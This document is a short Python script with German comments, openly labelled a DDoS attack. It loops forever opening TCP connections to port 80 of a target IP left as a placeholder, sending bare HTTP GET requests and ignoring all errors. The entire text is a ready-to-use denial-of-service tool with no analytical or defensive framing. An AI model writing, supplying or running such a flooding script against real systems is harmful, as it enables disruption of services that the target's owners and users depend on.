import socket
import random
import time

target_ip = "ZIEL_IP_ADRESSE_HIER_EINFÜGEN"
port = 80

def ddos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
            s.close()
        except:
            pass

# Starte die DDOS-Attacke
while True:
    ddos_attack()
